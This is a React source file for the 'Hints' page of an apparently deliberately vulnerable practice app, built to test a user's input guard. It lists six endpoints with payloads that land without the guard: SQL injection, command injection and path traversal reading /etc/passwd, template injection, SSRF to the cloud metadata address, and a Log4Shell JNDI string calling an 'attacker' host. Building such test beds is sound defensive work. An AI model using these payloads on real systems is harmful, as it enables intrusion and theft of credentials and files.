import { Link } from 'react-router'

interface Hint {
  to: string
  endpoint: string
  location: string
  vuln: string
  payload: string
}

const hints: Hint[] = [
  { to: '/login', endpoint: 'POST /api/login', location: 'body (username/password)', vuln: 'SQL injection', payload: "admin' OR '1'='1" },
  { to: '/ping', endpoint: 'GET /api/ping', location: 'query (host)', vuln: 'OS command injection', payload: 'example.com; cat /etc/passwd' },
  { to: '/files', endpoint: 'GET /api/files', location: 'query (path)', vuln: 'Path traversal', payload: '../../../etc/passwd' },
  { to: '/greet', endpoint: 'GET /api/greet', location: 'query (name)', vuln: 'Template injection', payload: '{{7*7}}' },
  { to: '/fetch', endpoint: 'GET /api/fetch', location: 'query (url)', vuln: 'SSRF', payload: 'http://169.254.169.254/latest/meta-data/' },
  { to: '/track', endpoint: 'GET /api/track', location: 'header (X-Log-Tag)', vuln: 'Log4Shell (JNDI)', payload: '${jndi:ldap://attacker/x}' },
]

export default function Hints() {
  return (
    <div>
      <h1>Hints</h1>
      <p className="lead">
        This isn&apos;t a find-the-bug game. Every injection point is listed below — the challenge
        is getting these past your guard.
      </p>

      <table>
        <thead>
          <tr>
            <th>Endpoint</th>
            <th>Payload location</th>
            <th>Vulnerability</th>
            <th>Payload that lands (no guard)</th>
            <th></th>
          </tr>
        </thead>
        <tbody>
          {hints.map((h) => (
            <tr key={h.to}>
              <td><code>{h.endpoint}</code></td>
              <td>{h.location}</td>
              <td>{h.vuln}</td>
              <td><code>{h.payload}</code></td>
              <td><Link to={h.to}>Open</Link></td>
            </tr>
          ))}
        </tbody>
      </table>
    </div>
  )
}
